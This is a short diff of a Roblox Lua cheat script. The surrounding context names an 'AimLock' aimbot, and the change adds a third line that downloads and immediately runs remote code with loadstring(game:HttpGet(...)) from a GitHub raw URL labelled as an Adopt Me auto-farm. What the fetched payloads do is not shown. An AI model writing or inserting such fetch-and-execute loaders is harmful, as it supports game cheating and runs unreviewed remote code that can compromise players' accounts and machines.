@@ -61,6 +61,7 @@ RunService:BindToRenderStep("AimLock", 0, function()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/bzzz"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/bzzzzz"))()
 
 
 local denied_message = "Denied Goofy"
